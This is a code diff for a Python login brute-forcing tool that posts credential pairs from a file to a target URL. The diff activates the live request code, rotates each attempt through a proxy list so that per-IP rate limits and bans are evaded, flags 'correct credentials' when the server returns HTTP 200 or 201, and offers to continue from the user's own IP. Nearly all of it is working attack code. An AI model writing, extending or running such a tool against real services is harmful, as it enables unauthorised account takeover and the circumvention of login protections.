@@ -9,56 +9,6 @@ import urllib.request, urllib.error, urllib.response, urllib.parse
 from packages.config import *
 
 
-class BruteforcerG:
-    def __init__(
-        self, url, form_scheme, credentials_file, proxies, attemps_per_ip
-    ) -> None:
-        self.url = url
-        self.form_scheme = form_scheme
-        with open(credentials_file) as f:
-            self.credentials_list = [
-                (line.split(":")[0], line.split(":")[1].rstrip()) for line in f
-            ]
-        with open(proxies) as f:
-            self.proxies = [line.rstrip() for line in f]
-        self.attemps_per_ip = attemps_per_ip
-
-    def proxy_rotating_attack(self, index, data_bytes):
-        proxy_handler = urllib.request.ProxyHandler(
-            {"http": self.proxies[index], "https": self.proxies[index]}
-        )
-        opener = urllib.request.build_opener(proxy_handler)
-        opener.addheaders = [("User-agent", "Mozilla/5.0")]
-        urllib.request.install_opener(opener)
-        request = urllib.request.Request(self.url, data=data_bytes)
-        with urllib.request.urlopen(request, timeout=10) as response:
-            print(response.status)
-
-    def perform_bruteforce(self):
-        counter = 0
-        index = 0
-        json_tool = JsonData(self.form_scheme)
-        if self.attemps_per_ip * len(self.proxies) < len(self.credentials_list):
-            print(
-                f"It's too much answers (`{len(self.credentials_list)}`) to check for `{len(self.proxies)}` IPs! Incease the number of attemps per one IP or decrease the number of answers"
-            )
-        else:
-            for credentials in self.credentials_list:
-                if counter < self.attemps_per_ip:
-                    data_to_post = json_tool.create_json_to_injection(credentials)
-                    data_bytes = str.encode(json.dumps(data_to_post))
-                    print(
-                        f"IP: {self.proxies[index]}, Data: {json.dumps(data_to_post)}"
-                    )
-                    # self.proxy_rotating_attack(index, data_bytes)
-                    # jeśli się uda to git
-                    # jeśli nie to zmień IP na następny
-                    counter = counter + 1
-                else:
-                    index = index + 1
-                    counter = 0
-
-
 class Bruteforcer:
     def __init__(
         self,
@@ -88,6 +38,7 @@ class Bruteforcer:
                 )
             for line in credentials_file:
                 # pomija puste linijki
+                line = line.rstrip()
                 if line.strip():
                     current_fields_cnt = line.count(":") + 1
                     # debug
@@ -153,17 +104,32 @@ class Bruteforcer:
             try:
                 index = self.proxy_rotating_injection(index, str.encode(data_to_post))
             except urllib.error.HTTPError as HTTPe:
-                print(f"Exception: {HTTPe}")
-            except urllib.error.URLError as URLe:
-                old_size_proxy_list = len(set(self.proxies)) - 1
-                print(f"Exception: `{URLe}`")
-                self.proxies = [i for i in self.proxies if i != self.proxies[index]]
-                if index != old_size_proxy_list:
-                    index = index + 1
+                if HTTPe.reason == "Bad Request":
+                    print("[-] Incorrect credentials [-]")
                 else:
-                    index = 0
-                    # recursion
+                    print(f"Exception: {HTTPe}")
+            except urllib.error.URLError as URLe:
+                print(f"Exception: `{URLe}`! I'll try it with another IP from list")
+                self.proxies = [i for i in self.proxies if i != self.proxies[index]]
+                if self.proxies:
+                    old_size_proxy_list = len(self.proxies) - 1
+                    print(f"INDEX {index}, SIZE {old_size_proxy_list}")
+                    if index < old_size_proxy_list:
+                        index = index + 1
+                    else:
+                        index = 0
+                        # recursion
                     index = control_the_proxy_rotation(index, data_to_post)
+                else:
+                    keyboard_input = str(
+                        input("Continue bruteforce without proxy? Y or N?")
+                    )
+                    if keyboard_input.lower() in ["Y", "yes", "yeah", ""]:
+                        pass
+                    else:
+                        print("Bye!")
+                        sys.exit(0)
+                    print("I'll continue with your IP")
             return index
 
         counter = 0
@@ -177,22 +143,27 @@ class Bruteforcer:
             if self.proxies:
                 index = control_the_proxy_rotation(index, data_to_post)
                 if counter < self.attemps_per_ip:
-                    # TODO
-                    # jeśli się uda to git
-                    # jeśli nie to zmień IP na następny
                     counter = counter + 1
                 else:
+                    # zmiana indexu IP do bruteforce
                     if index != len(self.proxies) - 1:
                         index = index + 1
                     else:
                         index = 0
                     counter = 0
             else:
-                self.standard_injection(str.encode(data_to_post))
+                try:
+                    self.standard_injection(str.encode(data_to_post))
+                except urllib.error.HTTPError as HTTPe:
+                    if HTTPe.reason == "Bad Request":
+                        print("[-] Incorrect credentials [-]")
+                    else:
+                        print(f"Exception: {HTTPe}")
+                except urllib.error.URLError as URLe:
+                    print(f"Exception: `{URLe}`")
         pass
 
     def proxy_rotating_injection(self, index, data_bytes):
-        # print(index, self.proxies)
         print(f"IP: `{self.proxies[index]}`, Data: `{data_bytes}`")
         proxy_handler = urllib.request.ProxyHandler(
             {"http": self.proxies[index], "https": self.proxies[index]}
@@ -203,31 +174,22 @@ class Bruteforcer:
         request = urllib.request.Request(self.url, data=data_bytes)
         with urllib.request.urlopen(request, timeout=10) as response:
             print(response.status)
+        if response.code in [200, 201]:
+            print(f"Correct credentials `{data_bytes}`")
+            sys.exit(0)
         return index
 
     def standard_injection(self, data_bytes):
         print(f"IP: Your IP, Data: `{data_bytes}`")
-        # opener = urllib.request.build_opener()
-        # opener.addheaders = [("User-agent", "Mozilla/5.0")]
-        # urllib.request.install_opener(opener)
-        # request = urllib.request.Request(self.url, data=data_bytes)
-        # with urllib.request.urlopen(request, timeout=10) as response:
-        #     print(response.status)
-
-
-class JsonData:
-    def __init__(self, form_scheme) -> None:
-        self.json_scheme = open(form_scheme)
-
-    def create_json_to_injection(self, credentials):
-        data_to_post = json.load(self.json_scheme)
-        for key in data_to_post:
-            for i in range(len(CREDENTIAL_ENVS)):
-                if CREDENTIAL_ENVS[i] in data_to_post[key]:
-                    data_to_post[key] = unpack_variables_from_json(
-                        data_to_post[key], credentials[i]
-                    )
-        return data_to_post
+        opener = urllib.request.build_opener()
+        opener.addheaders = [("User-agent", "Mozilla/5.0")]
+        urllib.request.install_opener(opener)
+        request = urllib.request.Request(self.url, data=data_bytes)
+        with urllib.request.urlopen(request, timeout=10) as response:
+            print(response.status)
+        if response.code in [200, 201]:
+            print(f"Correct credentials `{data_bytes}`")
+            sys.exit(0)
 
 
 parser = argparse.ArgumentParser()
